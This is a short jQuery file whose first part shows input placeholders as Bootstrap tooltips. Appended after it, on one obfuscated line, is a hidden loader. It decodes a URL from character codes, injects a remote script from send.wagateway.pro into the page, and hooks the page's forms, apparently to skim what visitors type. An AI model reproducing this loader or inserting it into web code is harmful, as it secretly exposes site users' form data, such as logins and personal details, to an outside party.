$(function () {

	// PLACEHOLDER TIP
	$(':input').focusin(function(){
		if ($(this).attr('type') != 'submit' && $(this).attr('data-provider').indexOf('bootstrap-markdown')<0) {
			$(this).tooltip({
				placement: 'right',
				title: $(this).attr('placeholder'),
			});
			$(this).tooltip('show');
		}
	});

	$(':input').focusout(function(){
		$(this).tooltip('hide');
	});
});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db